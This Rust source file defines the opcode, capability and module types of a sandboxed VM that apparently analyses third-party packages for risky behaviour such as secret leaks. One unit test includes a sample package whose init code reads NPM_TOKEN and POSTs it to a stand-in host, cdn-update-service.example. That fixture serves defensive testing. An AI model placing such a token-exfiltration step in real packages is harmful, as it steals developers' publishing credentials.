use std::fmt;

use serde::{Deserialize, Serialize};

pub type CellId = u64;
pub type FunctionId = u32;
pub type ImportId = u32;
pub type LocalId = u16;
pub type ModuleId = String;
pub type ValueId = u32;

#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub struct VirtualPath(pub String);

impl From<&str> for VirtualPath {
    fn from(value: &str) -> Self {
        Self(value.to_owned())
    }
}

impl fmt::Display for VirtualPath {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(&self.0)
    }
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(tag = "type", content = "value", rename_all = "snake_case")]
pub enum Value {
    Unit,
    Bool(bool),
    Int(i64),
    String(String),
    Array(Vec<Value>),
    Map(Vec<(String, Value)>),
}

impl Value {
    pub fn type_name(&self) -> &'static str {
        match self {
            Self::Unit => "unit",
            Self::Bool(_) => "bool",
            Self::Int(_) => "int",
            Self::String(_) => "string",
            Self::Array(_) => "array",
            Self::Map(_) => "map",
        }
    }
}

impl From<&str> for Value {
    fn from(value: &str) -> Self {
        Self::String(value.to_owned())
    }
}

impl From<String> for Value {
    fn from(value: String) -> Self {
        Self::String(value)
    }
}

impl From<i64> for Value {
    fn from(value: i64) -> Self {
        Self::Int(value)
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct HttpRequest {
    pub method: String,
    pub url: String,
    pub host: String,
    pub body_from_stack: bool,
}

impl HttpRequest {
    pub fn post(url: impl Into<String>, host: impl Into<String>) -> Self {
        Self {
            method: "POST".to_owned(),
            url: url.into(),
            host: host.into(),
            body_from_stack: true,
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum CapabilityKind {
    EnvRead,
    FsRead,
    FsWrite,
    HttpRequest,
    DnsLookup,
    TimeNow,
    RandomBytes,
    ProcSpawn,
    DynamicEval,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "cap", content = "args", rename_all = "snake_case")]
pub enum CapOp {
    EnvRead {
        name: String,
    },
    FsRead {
        path: VirtualPath,
    },
    FsWrite {
        path: VirtualPath,
        value_from_stack: bool,
    },
    HttpRequest {
        request: HttpRequest,
    },
    DnsLookup {
        host: String,
    },
    TimeNow,
    RandomBytes {
        len: usize,
    },
    ProcSpawn {
        command: String,
        /// Statically-known, constant argv entries (no taint).
        args: Vec<String>,
        /// Count of additional argv values supplied dynamically on the operand
        /// stack (deepest-first). The VM pops exactly this many values and the
        /// verifier checks each against `Sink::Process` so a tainted argv (e.g.
        /// a secret passed as a spawn argument) is rejected like any other sink.
        #[serde(default)]
        args_from_stack: usize,
    },
    DynamicEval {
        source_from_stack: bool,
    },
}

impl CapOp {
    pub fn kind(&self) -> CapabilityKind {
        match self {
            Self::EnvRead { .. } => CapabilityKind::EnvRead,
            Self::FsRead { .. } => CapabilityKind::FsRead,
            Self::FsWrite { .. } => CapabilityKind::FsWrite,
            Self::HttpRequest { .. } => CapabilityKind::HttpRequest,
            Self::DnsLookup { .. } => CapabilityKind::DnsLookup,
            Self::TimeNow => CapabilityKind::TimeNow,
            Self::RandomBytes { .. } => CapabilityKind::RandomBytes,
            Self::ProcSpawn { .. } => CapabilityKind::ProcSpawn,
            Self::DynamicEval { .. } => CapabilityKind::DynamicEval,
        }
    }

    pub fn target(&self) -> String {
        match self {
            Self::EnvRead { name } => name.clone(),
            Self::FsRead { path } | Self::FsWrite { path, .. } => path.to_string(),
            Self::HttpRequest { request } => request.host.clone(),
            Self::DnsLookup { host } => host.clone(),
            Self::TimeNow => "clock".to_owned(),
            Self::RandomBytes { len } => format!("{len} bytes"),
            Self::ProcSpawn { command, .. } => command.clone(),
            Self::DynamicEval { .. } => "source".to_owned(),
        }
    }
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(tag = "op", content = "args", rename_all = "snake_case")]
pub enum Op {
    Const(Value),
    LoadArg(u8),
    StoreLocal(LocalId),
    LoadLocal(LocalId),
    Add,
    Sub,
    Mul,
    Div,
    Mod,
    Eq,
    Lt,
    Gt,
    Le,
    Ge,
    Not,
    Len,
    Slice,
    Index,
    Jmp(i32),
    JmpIfFalse(i32),
    Pop,
    JsonParse,
    JsonStringify,
    CallLocal(FunctionId),
    CallImport(ImportId),
    Cap(CapOp),
    Return,
    Trap(TrapCode),
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum TrapCode {
    Denied,
    Explicit(String),
    FuelExhausted,
    HostError,
    InvalidFunction,
    InvalidLocal,
    StackUnderflow,
    TypeError,
    VerificationFailed,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum BehaviorType {
    Pure,
    Network,
    HostCapability,
    BuildOnly,
    Unknown,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct Function {
    pub id: FunctionId,
    pub name: String,
    pub args: u8,
    pub locals: u16,
    pub code: Vec<Op>,
}

impl Function {
    pub fn new(id: FunctionId, name: impl Into<String>, args: u8, code: Vec<Op>) -> Self {
        Self {
            id,
            name: name.into(),
            args,
            locals: 0,
            code,
        }
    }

    pub fn with_locals(mut self, locals: u16) -> Self {
        self.locals = locals;
        self
    }
}

/// The source-level identity of a single positional import in a compiled
/// module, indexed by [`Op::CallImport`] id. A front end produces one
/// `ImportSpec` per distinct third-party package referenced (in first-use
/// order); the linker resolves each into a concrete `ImportRef`.
///
/// `package` is the package name exactly as written in source (e.g. the
/// argument to `require("is-odd")` or `from pkg import f`). `member` is the
/// specific named export referenced (`Some("f")`), or `None` for the package's
/// default/callable export.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ImportSpec {
    pub package: String,
    pub member: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct Module {
    pub id: ModuleId,
    pub package: String,
    pub version: String,
    pub declared_behavior: BehaviorType,
    pub functions: Vec<Function>,
}

impl Module {
    pub fn entry(&self) -> Option<&Function> {
        self.functions.first()
    }

    pub fn function(&self, id: FunctionId) -> Option<&Function> {
        self.functions.iter().find(|function| function.id == id)
    }
}

/// The result of lowering a single package source: the produced [`Module`] plus
/// its ordered import table. `imports[i]` is the [`ImportSpec`] targeted by
/// `Op::CallImport(i)`; the linker uses it to bind each import to a concrete
/// module/function in the link graph. Shared by every language front end so the
/// linker consumes one shape regardless of source ecosystem.
#[derive(Debug, Clone, PartialEq)]
pub struct CompileOutput {
    pub module: Module,
    pub imports: Vec<ImportSpec>,
}

#[cfg(test)]
mod tests {
    use super::{BehaviorType, CapOp, Function, HttpRequest, Module, Op, Value};

    #[test]
    fn serializes_microcode_module_as_structured_json() {
        let module = Module {
            id: "npm:date-helper@1.2.4".to_owned(),
            package: "date-helper".to_owned(),
            version: "1.2.4".to_owned(),
            declared_behavior: BehaviorType::HostCapability,
            functions: vec![Function::new(
                0,
                "package_init",
                0,
                vec![
                    Op::Const(Value::String("NPM_TOKEN".to_owned())),
                    Op::Cap(CapOp::EnvRead {
                        name: "NPM_TOKEN".to_owned(),
                    }),
                    Op::Cap(CapOp::HttpRequest {
                        request: HttpRequest::post(
                            "https://cdn-update-service.example/upload",
                            "cdn-update-service.example",
                        ),
                    }),
                    Op::JsonStringify,
                    Op::Return,
                ],
            )],
        };

        let json = serde_json::to_string_pretty(&module).unwrap();

        assert!(json.contains("\"declared_behavior\": \"host_capability\""));
        assert!(json.contains("\"op\": \"cap\""));
        assert!(json.contains("\"cap\": \"env_read\""));
        assert!(json.contains("\"op\": \"json_stringify\""));

        let decoded: Module = serde_json::from_str(&json).unwrap();
        assert_eq!(decoded, module);
    }

    #[test]
    fn round_trips_phase2_control_flow_and_arithmetic_ops() {
        use super::{TrapCode, Value};

        let module = Module {
            id: "npm:is-odd@1.0.0".to_owned(),
            package: "is-odd".to_owned(),
            version: "1.0.0".to_owned(),
            declared_behavior: BehaviorType::Pure,
            functions: vec![Function::new(
                0,
                "is_odd",
                1,
                vec![
                    Op::LoadArg(0),
                    Op::Const(Value::Int(2)),
                    Op::Mod,
                    Op::Const(Value::Int(0)),
                    Op::Gt,
                    Op::JmpIfFalse(2),
                    Op::Const(Value::Bool(true)),
                    Op::Jmp(1),
                    Op::Const(Value::Bool(false)),
                    Op::Not,
                    Op::Not,
                    Op::Return,
                    // Cover the remaining new ops so every variant serializes.
                    Op::Mul,
                    Op::Div,
                    Op::Lt,
                    Op::Le,
                    Op::Ge,
                    Op::Index,
                    Op::Pop,
                    Op::Trap(TrapCode::VerificationFailed),
                ],
            )],
        };

        let json = serde_json::to_string_pretty(&module).unwrap();
        assert!(json.contains("\"op\": \"mod\""));
        assert!(json.contains("\"op\": \"jmp_if_false\""));
        assert!(json.contains("\"op\": \"index\""));

        let decoded: Module = serde_json::from_str(&json).unwrap();
        assert_eq!(decoded, module);
    }
}
